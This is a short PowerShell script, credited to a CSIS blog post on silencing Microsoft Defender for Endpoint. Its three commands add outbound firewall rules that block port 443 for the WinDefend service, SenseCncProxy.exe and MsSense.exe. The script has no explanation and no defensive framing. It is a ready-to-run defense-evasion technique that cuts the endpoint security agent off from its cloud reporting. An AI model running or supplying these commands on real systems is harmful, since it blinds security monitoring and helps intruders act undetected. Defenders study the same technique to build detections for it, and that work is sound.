# @credits to https://medium.com/csis-techblog/silencing-microsoft-defender-for-endpoint-using-firewall-rules-3839a8bf8d18
New-NetFirewallRule -DisplayName "Block 443 MsMpEng" -Name "Block 443 MsMpEng" -Direction Outbound -Service WinDefend -Enabled True -RemotePort 443 -Protocol TCP -Action Block
New-NetFirewallRule -DisplayName "Block 443 SenseCncProxy" -Name "Block 443 SenseCncProxy" -Direction Outbound -Program "%ProgramFiles%\Windows Defender Advanced Threat Protection\SenseCncProxy.exe" -RemotePort 443 -Protocol TCP -Action Block
New-NetFirewallRule -DisplayName "Block 443 MsSense" -Name "Block 443 MsSense" -Direction Outbound -Program "%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe" -RemotePort 443 -Protocol TCP -Action Block
